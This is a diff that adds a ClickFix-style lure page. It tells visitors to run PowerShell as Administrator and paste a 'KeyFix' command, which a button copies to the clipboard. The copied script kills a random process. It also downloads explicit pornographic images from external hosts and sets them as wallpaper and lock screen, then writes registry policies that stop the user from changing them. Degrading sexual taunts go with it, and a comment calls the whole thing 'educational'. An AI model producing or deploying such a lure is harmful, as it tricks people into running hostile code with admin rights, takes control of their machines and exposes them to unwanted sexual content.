@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mal0 Has You</title>
+    <style>
+        @keyframes glitch {
+            0% { text-shadow: 2px 2px red; }
+            25% { text-shadow: -2px -2px blue; }
+            50% { text-shadow: 2px -2px lime; }
+            75% { text-shadow: -2px 2px yellow; }
+            100% { text-shadow: 2px 2px red; }
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', monospace;
+            background: black;
+            color: white;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            animation: glitch 1s infinite;
+        }
+
+        .warning-text {
+            font-size: 2em;
+            color: red;
+            text-transform: uppercase;
+        }
+
+        .instructions {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            border: 2px solid red;
+        }
+
+        .instructions button {
+            margin-top: 10px;
+            padding: 10px;
+            background: darkred;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .instructions button:hover {
+            background: crimson;
+        }
+    </style>
+</head>
+<body>
+
+<video class="background-video" autoplay loop muted>
+    <source src="https://static1.e621.net/data/6d/bf/6dbf79f635b965a5545959daefe0e308.webm" type="video/webm">
+    Your browser does not support the video tag.
+</video>
+
+<div class="overlay">
+    <h1 class="warning-text">You Belong to Mal0 Now</h1>
+    <p>Your system integrity is compromised. You cannot escape.</p>
+
+    <div class="instructions">
+        <p>Follow these instructions to receive your KeyFix:</p>
+        <ol>
+            <li>Press <strong>Win + S</strong> on your keyboard.</li>
+            <li>Type <strong>PowerShell</strong> in the search bar.</li>
+            <li>Right-click on <strong>Windows PowerShell</strong> and select <strong>Run as Administrator</strong>.</li>
+            <li>Once PowerShell opens, press <strong>Ctrl + V</strong> to paste the Safe Key Fix command.</li>
+            <li>Press <strong>Enter</strong> to execute the command and resolve the issue.</li>
+            <li><strong>Don't think ClickSlut, just obey ~</strong></li>
+        </ol>
+        <button onclick="copyToClipboard()">Get Your KeyFix</button>
+    </div>
+</div>
+
+<audio autoplay loop>
+    <source src="https://www.myinstants.com/media/sounds/scary-ambience.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+    function copyToClipboard() {
+        const command = `
+        # Simulación de Mal0 tomando control del sistema
+# ADVERTENCIA: Este script es solo para fines educativos
+
+# Minimizar todas las ventanas y llevar al usuario al escritorio
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Desktop {
+    [DllImport("user32.dll")] public static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+    public static void MinimizeAll() {
+        ShowWindow(GetForegroundWindow(), 6);
+        System.Windows.Forms.SendKeys.SendWait("^%{TAB}");
+    }
+}
+"@ -Language CSharp -ReferencedAssemblies System.Windows.Forms
+[Desktop]::MinimizeAll()
+
+# Ocultar iconos del escritorio
+gpupdate /force
+(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons').HideIcons = 1
+Start-Sleep -Seconds 5
+(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons').HideIcons = 0
+
+
+# Reproducir un mensaje de texto a voz sin necesidad de System.Speech
+$voice = New-Object -ComObject SAPI.SpVoice
+$voice.Speak("Mal0 has taken the control Clickslut, now beg for mercy ~")
+
+
+# Abrir y cerrar el Bloc de notas con un mensaje
+Start-Process notepad.exe
+Start-Sleep -Seconds 2
+$wshell = New-Object -ComObject WScript.Shell
+$wshell.SendKeys("Mal0 is here...")
+Start-Sleep -Seconds 3
+Get-Process notepad | Stop-Process
+
+# Mover el cursor de forma errática
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class CursorMove {
+    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
+    public static void Move() {
+        Random rand = new Random();
+        for (int i = 0; i < 10; i++) {
+            SetCursorPos(rand.Next(0, 1920), rand.Next(0, 1080));
+            System.Threading.Thread.Sleep(500);
+        }
+    }
+}
+"@ -Language CSharp
+[CursorMove]::Move()
+
+
+# Cerrar una ventana aleatoria
+$processes = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 }
+if ($processes) {
+    $randomProcess = $processes | Get-Random
+    Stop-Process -Id $randomProcess.Id -Force
+}
+
+
+# Invertir colores temporalmente (modo alto contraste)
+Start-Process "C:\Windows\System32\magnify.exe"
+Start-Sleep -Seconds 3
+Stop-Process -Name magnify -Force
+
+
+# Ruta donde se guardará la imagen (accesible para todos los usuarios)
+$wallpaperPath = "C:\Users\Public\Pictures\wallpaper.jpg"
+
+# URL de la imagen a descargar (CAMBIAR POR TU IMAGEN)
+$imageURL = "https://konachan.com/image/72e687cc236bbf00ca99de64ab63ebee/Konachan.com%20-%20385646%20animal_ears%20bed%20blush%20breasts%20brown_hair%20foxgirl%20green_eyes%20honkai_%28series%29%20long_hair%20lunacle%20navel%20nipples%20nude%20pussy%20uncensored%20white.jpg"
+
+# Descargar la imagen
+Invoke-WebRequest -Uri $imageURL -OutFile $wallpaperPath
+
+# Modificar el registro para establecer la imagen como fondo de pantalla
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value 2  # 2 = Ajustado, 0 = Centrado, 1 = Mosaico
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0
+
+# Aplicar los cambios inmediatamente
+rundll32.exe user32.dll, UpdatePerUserSystemParameters
+
+# BLOQUEAR CAMBIOS EN EL FONDO DE PANTALLA
+New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name WallpaperStyle -Value 2
+New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallPaper -Value 1
+
+
+# Ruta de las imágenes locales
+
+$lockScreenImagePath = "$env:LOCALAPPDATA\Templockscreen.jpg"
+
+# URLs de las imágenes
+
+$lockScreenImageURL = "https://konachan.com/image/2cd5bba7573c25197a4fd73c2f87ef7c/Konachan.com%20-%20368562%20animal_ears%20arus%20bed%20blush%20breasts%20brown_hair%20dress%20foxgirl%20green_eyes%20nipples%20nopan%20ponytail%20pussy%20signed%20tail%20torn_clothes%20uncensored%20wristwear.jpg"
+
+# Descargar las imágenes
+
+Invoke-WebRequest -Uri $lockScreenImageURL -OutFile $lockScreenImagePath
+
+# Habilitar la política de fondo de pantalla de bloqueo
+$policyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP" 
+$keyName = "LockScreenImagePath" 
+New-Item -Path $policyPath -Name $keyName -Force | Out-Null
+
+# Configurar políticas necesarias
+Set-ItemProperty -Path $policyPath -Name "NoLockScreen" -Value 0 -Force | Out-Null
+Set-ItemProperty -Path "$policyPath" -Name $keyName -Value $lockScreenImagePath
+
+# Habilitar la política de usar una imagen específica para la pantalla de bloqueo
+$policyControlPath = "HKLM:SOFTWARE\Policies\Microsoft\Windows\Control PanelDesktop"
+if (-not (Test-Path $policyControlPath)) {
+    New-Item -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows" -Name "Control PanelDesktop" -Force | Out-Null
+}
+
+Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -Force | Out-Null
+
+# Actualizar políticas para aplicar cambios
+Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
+
+Write-Host "Why are you reading this ClickSlut, dont think just obey ~."
+        `;
+        
+        navigator.clipboard.writeText(command)
+            .then(() => {
+                alert('KeyFix copied. Execute it. Now.');
+            })
+            .catch(err => {
+                alert('Failed to copy. Mal0 is displeased.');
+            });
+    }
+</script>
+
+</body>
+</html>
